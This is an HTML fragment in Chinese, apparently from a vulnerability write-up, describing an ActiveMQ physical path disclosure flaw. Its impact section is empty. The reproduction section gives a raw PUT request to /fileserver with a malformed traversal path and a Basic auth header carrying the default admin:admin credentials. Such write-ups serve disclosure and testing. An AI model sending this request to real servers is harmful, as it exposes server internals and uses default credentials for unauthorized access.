	<body>
		<h1 class="csAD577193">
			<a name="activemq物理路径泄漏漏洞"><span class="csDE05BCC">ActiveMQ</span><span class="csECDA2D3">物理路径泄漏漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ActiveMQ</span><span class="cs9C1B1871">默认开启</span><span class="cs8926E06">PUT</span><span class="cs9C1B1871">请求，当开启</span><span class="cs8926E06">PUT</span><span class="cs9C1B1871">时，构造好</span><span class="cs8926E06">Payload(</span><span class="cs9C1B1871">即不存在的目录</span><span class="cs8926E06">)</span><span class="cs9C1B1871">，</span><span class="cs8926E06">Response</span><span class="cs9C1B1871">会返回相应的物理路径信息</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">Request Raw:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 192.168.197.25:8161</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Authorization: Basic YWRtaW46YWRtaW4=</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 4</span></p></body>
